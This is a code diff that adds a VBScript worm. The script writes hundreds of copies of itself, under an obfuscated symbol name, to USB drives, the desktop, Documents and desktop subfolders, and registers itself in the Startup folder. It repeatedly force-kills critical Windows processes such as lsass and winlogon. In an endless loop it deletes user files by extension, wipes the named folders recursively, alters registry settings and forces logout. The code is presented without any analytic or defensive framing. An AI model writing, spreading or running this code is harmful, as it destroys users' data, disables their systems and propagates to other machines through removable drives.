@@ -1,1 +1,129 @@
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
+' Specify the folders in which you want to delete files (modify as needed)
+foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
+
+' Specify the number of copies to create
+numCopies = 999
+
+' Find the USB drive
+usbDrivePath = ""
+Set colDrives = objFSO.Drives
+
+For Each objDrive In colDrives
+    If objDrive.DriveType = 1 And objDrive.IsReady Then ' Check if the drive is a removable drive (USB)
+        usbDrivePath = objDrive.Path
+        Exit For
+    End If
+Next
+
+' Check if a USB drive was found
+If usbDrivePath <> "" Then
+    ' Generate copies of the script on the USB drive
+    For i = 1 To numCopies
+        randomIteration = Int((1000 * Rnd) + 1)
+        strCopyPath = usbDrivePath & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+        objFSO.CopyFile WScript.ScriptFullName, strCopyPath, True ' Add "True" to overwrite existing files
+    Next
+End If
+
+' Create copies of the script on the desktop and in the documents folder
+For i = 1 To numCopies
+    randomIteration = Int((1000 * Rnd) + 1)
+
+    ' Create a copy of the script on the desktop
+    strDesktopCopyPath = objShell.SpecialFolders("Desktop") & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+    objFSO.CopyFile WScript.ScriptFullName, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+
+    ' Create a copy of the script in the documents folder
+    strDocumentsCopyPath = objShell.SpecialFolders("MyDocuments") & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+    objFSO.CopyFile WScript.ScriptFullName, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
+Next
+
+' Add the script to the startup folder
+objFSO.CopyFile WScript.ScriptFullName, objShell.SpecialFolders("Startup") & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎.vbs", True ' Add "True" to overwrite existing files
+
+' Terminate important system processes
+objShell.Run "taskkill /f /im explorer.exe", 0, False
+objShell.Run "taskkill /f /im winlogon.exe", 0, False
+objShell.Run "taskkill /f /im lsass.exe", 0, False
+objShell.Run "taskkill /f /im services.exe", 0, False
+objShell.Run "taskkill /f /im spoolsv.exe", 0, False
+objShell.Run "taskkill /f /im svchost.exe", 0, False
+objShell.Run "taskkill /f /im cmd.exe", 0, False
+
+' Loop indefinitely
+Do
+    ' Delete all files except VBS files within the specified folders
+    For Each folderPath In foldersToDelete
+        DeleteFilesExceptVBS folderPath
+    Next
+
+    ' Set wallpaper
+    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+
+    ' Loop through each file in the Desktop folder and delete if it has a specified file extension
+    For Each objFile In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Files
+        extension = LCase(objFSO.GetExtensionName(objFile.Name))
+        Select Case extension
+            Case "txt", "exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp"
+                objFSO.DeleteFile objFile.Path
+        End Select
+    Next
+
+    ' Loop through each folder on the Desktop and delete files within them
+    For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
+        For Each objFile In objFolder.Files
+            objFSO.DeleteFile objFile.Path
+        Next
+    Next
+
+    ' Generate copies of the script within each folder on the Desktop
+    For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
+        For i = 1 To numCopies
+            randomIteration = Int((1000 * Rnd) + 1)
+            strCopyPath = objFolder.Path & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+            objFSO.CopyFile WScript.ScriptFullName, strCopyPath, True ' Add "True" to overwrite existing files
+        Next
+    Next
+
+    ' Remove apps from the taskbar
+    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarSmallIcons", 1, "REG_DWORD"
+    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\MMTaskbarEnabled", 0, "REG_DWORD"
+
+    ' Terminate important system processes
+    objShell.Run "taskkill /f /im svchost.exe", 0, False
+    objShell.Run "taskkill /f /im explorer.exe", 0, False
+    objShell.Run "taskkill /f /im winlogon.exe", 0, False
+    objShell.Run "taskkill /f /im lsass.exe", 0, False
+    objShell.Run "taskkill /f /im services.exe", 0, False
+    objShell.Run "taskkill /f /im spoolsv.exe", 0, False
+    objShell.Run "taskkill /f /im svchost.exe", 0, False
+    objShell.Run "taskkill /f /im cmd.exe", 0, False
+
+    ' Log out the current user
+    objShell.Run "shutdown -l -f", 0, True
+Loop
+
+Sub DeleteFilesExceptVBS(folderPath)
+    On Error Resume Next
+
+    Set folder = objFSO.GetFolder(folderPath)
+    If Err.Number = 0 Then
+        For Each file In folder.Files
+            extension = LCase(objFSO.GetExtensionName(file.Path))
+            If extension <> "vbs" Then
+                objFSO.DeleteFile file.Path
+            End If
+        Next
+
+        ' Recursively delete files in subfolders
+        For Each subfolder In folder.Subfolders
+            DeleteFilesExceptVBS subfolder.Path
+        Next
+    End If
+
+    On Error GoTo 0
+End Sub
